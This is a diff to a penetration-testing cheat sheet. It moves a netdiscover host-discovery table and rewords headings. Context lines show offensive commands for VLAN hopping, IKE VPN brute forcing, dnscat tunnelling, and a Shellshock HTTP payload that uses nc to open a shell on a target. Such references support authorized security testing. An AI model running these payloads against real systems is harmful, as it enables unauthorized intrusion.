@@ -262,6 +262,34 @@ Scan for a specific UDP service:
 udp-proto-scanner.pl -p ntp -f ips.txt
 ```
 
+###### Other Host Discovery
+
+Other methods of host discovery, that don't use nmap...
+
+<div class="mobile-side-scroller">
+<table>
+  <thead>
+    <tr>
+      <th>Command</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+      <tbody>
+
+    <tr>
+      <td>
+        <p><code>netdiscover -r 192.168.1.0/24</code></p>
+      </td>
+      <td>
+            <p>Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site</p>
+      </td>
+
+    </tr>
+  </tbody>
+</table>
+</div>
+
+
 ## Enumeration & Attacking Network Services 
 
 Tools that will spefically identify and / or enumerate network services: 
@@ -1218,7 +1246,7 @@ E.g Class A,B,C (depreciated)
 
 ### VLAN Hopping 
 
-Use NCCGroups VLAN wrapper script for Yersina, this makes the processes easier 
+Using NCCGroups VLAN wrapper script for Yersina simplifies the process. 
 
 ```
 git clone https://github.com/nccgroup/vlan-hopping.git
@@ -1261,13 +1289,11 @@ Bruteforce IKE VPN using IKEForce:
 ```
 
 
-
-
 ```
 ike-scan
 ike-scan TARGET-IP
-sudo ike-scan -A TARGET-IP
-sudo ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
+ike-scan -A TARGET-IP
+ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
 ```
 
 #### IKE Aggressive Mode PSK Cracking
@@ -1365,7 +1391,7 @@ dnscat --host <dnscat server_ip>
 
 ## Exploit Research
 
-Ways to find exploits for enumerated hosts / services.
+Find exploits for enumerated hosts / services.
 
 <div class="mobile-side-scroller">
 <table>
@@ -1444,7 +1470,7 @@ gcc -m64 -o output hello.c (64 bit)
 
 #### Exploiting Shellshock 
 
-A tool to find and exploit servers vulnerable to Shellshock
+A tool to find and exploit servers vulnerable to Shellshock:
 
 ```
 git clone https://github.com/nccgroup/shocker
@@ -1469,38 +1495,6 @@ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -
 ```
 nc -l -p 443
 ```
-
-
-
-
-
-### Other Host Discovery
-
-Other methods of host discovery, that don't use nmap...
-
-<div class="mobile-side-scroller">
-<table>
-  <thead>
-    <tr>
-      <th>Command</th>
-      <th>Description</th>
-    </tr>
-  </thead>
-      <tbody>
-
-    <tr>
-      <td>
-        <p><code>netdiscover -r 192.168.1.0/24</code></p>
-      </td>
-      <td>
-            <p>Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site</p>
-      </td>
-
-    </tr>
-  </tbody>
-</table>
-</div>
-
 
 
 
